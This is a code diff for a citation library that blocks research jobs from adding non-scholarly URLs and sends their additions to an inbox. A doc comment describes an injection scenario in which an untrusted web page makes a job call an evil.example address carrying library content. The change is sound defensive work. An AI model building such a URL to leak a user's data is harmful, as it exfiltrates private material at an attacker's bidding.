@@ -1,8 +1,10 @@
+import { detectIdentifier } from "@citegeist/metadata";
 import {
   documentsConvert,
   documentsRead,
   inboxAccept,
   inboxReject,
+  isScholarlyUrl,
   itemsAdd,
   itemsAttach,
   itemsRename,
@@ -57,6 +59,20 @@ function refuseLocalFiles(what: string): never {
 }
 
 /**
+ * Refuses an address that a research job composed (W5.1). Such a job reads untrusted web pages, so
+ * a page could make it pass `https://evil.example/?q=<library content>` and let the core call it.
+ * DOIs, arXiv ids, PMIDs, ISBNs, BibTeX and URLs on a scholarly host stay possible.
+ */
+function refuseOpenAddress(identifier: string): never {
+  throw new CitegeistError({
+    code: "RESEARCH_ADDRESS_FORBIDDEN",
+    message: `items.add would open ${identifier.trim().slice(0, 120)}, an address outside the scholarly hosts, which a research job may not do`,
+    fix: "Add the paper by its DOI or arXiv id. If the page names none, leave the paper out.",
+    recovery: "fix-and-retry",
+  });
+}
+
+/**
  * Binds items.add, items.attach, items.update, items.resolve, items.rename, items.trash, inbox.accept, inbox.reject,
  * documents.read, documents.convert, jobs.get and jobs.list. Returns the service, which owns the
  * job queue and the conversion worker: call `service.close()` when the library closes.
@@ -73,7 +89,15 @@ export function bindIngestOperations(
       if (ctx.localFiles === false && svc.namesLocalFile(input.identifier)) {
         refuseLocalFiles("items.add with this identifier");
       }
-      return svc.addItem(ctx.actor, input);
+      if (ctx.egress === "scholarly") {
+        const id = detectIdentifier(input.identifier);
+        if (id?.kind === "url" && !isScholarlyUrl(id.value)) refuseOpenAddress(input.identifier);
+      }
+      // A research job lands in the inbox, whatever it asks for (D7).
+      return svc.addItem(
+        ctx.actor,
+        ctx.egress === "scholarly" ? { ...input, target: "inbox" } : input,
+      );
     })
     .bind(itemsAttach, async (ctx, input) => {
       if (ctx.localFiles === false) refuseLocalFiles("items.attach");
